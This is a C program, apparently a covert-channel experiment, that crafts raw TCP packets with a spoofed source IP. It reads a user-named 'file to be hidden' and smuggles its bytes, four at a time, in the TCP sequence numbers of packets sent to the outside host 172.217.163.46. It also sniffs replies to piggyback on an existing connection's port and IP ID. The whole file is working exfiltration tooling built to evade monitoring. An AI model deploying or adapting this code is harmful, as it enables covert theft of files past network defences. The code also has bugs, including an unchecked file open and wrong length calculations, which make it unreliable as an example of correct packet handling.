
#include<stdio.h> 
#include<string.h> 
#include<sys/socket.h>
#include<stdlib.h> 
#include<errno.h> 
#include<netinet/tcp.h>
#include<netinet/ip.h> 
#include<arpa/inet.h>
#include <time.h>
#include <netinet/in.h>
#include <unistd.h>    
#include <pthread.h>
#include <sys/ipc.h>
#include <sys/uio.h>

char *read_file(char path[]){
    FILE *fileptr;
    char *buffer;
    long filelen;

    fileptr = fopen(path, "rb");  // Open the file in binary mode
    if(fileptr == NULL)
        printf("error");
    fseek(fileptr, 0, SEEK_END);          
    filelen = ftell(fileptr);            
    rewind(fileptr);                      

    buffer = (char *)malloc((filelen+1)*sizeof(char)); // Enough memory for file + \0
    fread(buffer, filelen, 1, fileptr); 
    fclose(fileptr); 
    return buffer;
}

struct pseudo_header{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};
 
unsigned short csum(unsigned short *ptr,int nbytes){
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1){
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1){
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     
    return(answer);
}









int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0,i,j;

void print_tcp_packet(unsigned char* Buffer, int Size)
{
    unsigned short iphdrlen;
     
    struct iphdr *iph = (struct iphdr *)Buffer;
    iphdrlen = iph->ihl*4;
    struct tcphdr *tcph=(struct tcphdr*)(Buffer + iphdrlen);
    printf(" %d %d %d ",tcph->seq,tcph->syn,tcph->ack);
} 
struct sockaddr_in source,dest;
int id = 0;
char *my_ip;
int ProcessPacket(unsigned char* buffer, int size)
{
    //Get the IP Header part of this packet
    unsigned short iphdrlen;
    struct iphdr *iph = (struct iphdr*)buffer;
    iphdrlen = iph->ihl*4;
     
    struct tcphdr *tcph=(struct tcphdr*)(buffer + iphdrlen);
    if(iph->protocol == 6){
        memset(&dest, 0, sizeof(dest));
        memset(&source, 0, sizeof(source));
        source.sin_addr.s_addr = iph->saddr;
        dest.sin_addr.s_addr = iph->daddr;
        if(strcmp(inet_ntoa(source.sin_addr),"172.217.163.46")==0){
            my_ip = inet_ntoa(dest.sin_addr);
            id = ntohs(iph->id);
            return ntohs(tcph->dest);
        }
    }
}

void sendpacket(int conn){
    int socket_desc;
    struct sockaddr_in server;
    char *message;
     
    //Create socket
    socket_desc = socket(AF_INET , SOCK_STREAM , 0);
    if (socket_desc == -1)
    {
        printf("Could not create socket");
    }
         
    server.sin_addr.s_addr = inet_addr("172.217.163.46");
    server.sin_family = AF_INET;
    server.sin_port = htons(44946);
 
    //Connect to remote server
    if(conn==0){
        if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        puts("connect error");
        
    }
     
    puts("Connected\n");
    }     
    //Send some data
    if(conn==1){message = "Hello";
    if( send(socket_desc , message , strlen(message) , 0) < 0)
    {
        puts("Send failed");
    }
    puts("Data Sent\n");
    }
}










int main (int argc, char const *argv[]){
    //Create a raw socket
    unsigned char *buffer = (unsigned char *)malloc(65536);
    int s = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
     
    if(s == -1){
        perror("Failed to create socket");
        exit(1);
    }

    //Datagram to represent the packet
    char datagram[4096] , source_ip[32] , *pseudogram;
     
    memset (datagram, 0, 4096);
     
    //IP header
    struct iphdr *iph = (struct iphdr *) datagram;
     
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct iphdr));
    struct sockaddr_in sin;
    struct pseudo_header psh;








    








    memset(&sin, '0', sizeof(sin));
    //Data part 
    char *data;
    data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
    strcpy(data,"hello");
    //int *data = (int *)calloc(100, sizeof(char));
    //printf("%ld",sizeof(data));
     
    //Address resolution
    strcpy(source_ip , "192.168.43.25");
    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);
    sin.sin_addr.s_addr = inet_addr ("172.217.163.46");
  
     
    //Complete IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + 10*sizeof(data);
    iph->id = htonl (54321); //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->saddr = inet_addr ( source_ip );    //Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;
     
    //Ip checksum
    iph->check = csum ((unsigned short *) datagram, iph->tot_len);
    
    //Complete TCP Header
    tcph->source = htons (44946);
    tcph->dest = htons (80);
    tcph->seq = 9;
    tcph->ack_seq = 0;
    tcph->doff = 5;  //tcp header size
    tcph->fin=0;
    tcph->syn=0;
    tcph->rst=0;
    tcph->psh=1;
    tcph->ack=1;
    tcph->urg=0;
    tcph->window = htons (5840); /* maximum allowed window size */
    tcph->check = 0; //leave checksum 0 now, filled later by pseudo header
    tcph->urg_ptr = 0;
     
    //TCP checksum
    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + 10*sizeof(data) );
     
    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + 10*sizeof(data);
    pseudogram = malloc(psize);
     
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + 10*sizeof(data));
     
    tcph->check = csum( (unsigned short*) pseudogram , psize);
     
    int one = 1;
    const int *val = &one;
     
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0){
        perror("Error setting IP_HDRINCL");
        exit(0);
    }





    
    int saddr_size , data_size;
    /*while(1)
    {
        saddr_size = sizeof(struct sockaddr);
        //Receive a packet
        data_size = recvfrom(s , buffer , 65536 , 0 , (struct sockaddr *)&sin , &saddr_size);printf("poolu\n");
        if(data_size <0 )
        {
            printf("Recvfrom error , failed to get packets\n");
            return 1;
        }
        //Now process the packet
        
        ProcessPacket(buffer , data_size);
    }*/








    
    struct sockaddr_in address;
    int sock = 0, valread;
    struct sockaddr_in serv_addr;
    char *hello = "Hello from client";
    char buff[1024] = {0};
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        printf("\n Socket creation error \n");
        return -1;
    }
  
    memset(&serv_addr, '0', sizeof(serv_addr));
  
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(44946);
      
    // Convert IPv4 and IPv6 addresses from text to binary form
    if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)<=0) 
    {
        printf("\nInvalid address/ Address not supported \n");
        return -1;
    }
    //s = sock;

    /*if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        printf("\nConnection Failed \n");
        return -1;
    }
    s = sock;
    send(s , hello , strlen(hello) , 0 );
    printf("Hello message sent\n");
    if (sendto (s, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0){
            perror("Failed to send");
        }
        else{
            printf ("Packet Sent \n");
        }*/
        










    //sendpacket(0);
    //Send the packet
    int32_t sequence;
    char path[20];
    printf("Enter name of file to be hidden: ");
    scanf("%s",path);
    int byte_count = 0;
    char *msg = read_file(path);

    
    while(1)
    {
        if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0)
    {
        printf("\nConnection Failed \n");
        return -1;
    }
        int port =0;
        saddr_size = sizeof(struct sockaddr);
        //Receive a packet
        data_size = recvfrom(s , buffer , 65536 , 0 , (struct sockaddr *)&sin , &saddr_size);
        if(data_size <0 )
        {
            printf("Recvfrom error , failed to get packets\n");
            return 1;
        }
        //Now process the packet
        
        port = ProcessPacket(buffer , data_size);
        if(port != 0){
            tcph->source = htons(port);
            iph->id = id + 1;
            iph->saddr = inet_addr ( my_ip );
            printf("%d\n",port);
            break;
        }
    }
    while(msg[byte_count] != '\0'){
        //sendpacket(0);
        sequence = (int32_t)msg[byte_count];
        while(byte_count % 4 != 3){
            byte_count++;
            sequence = sequence | (((int32_t)msg[byte_count]) << (8*(byte_count % 4))); 
        } 
        tcph->seq = sequence;
        //send(s , hello , strlen(hello) , 0 );

        if (sendto (s, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0){
            perror("Failed to send");
        }
        else{
            printf ("Packet Sent %d\n",sequence);
        }
        byte_count++;
    }
    return 0;
}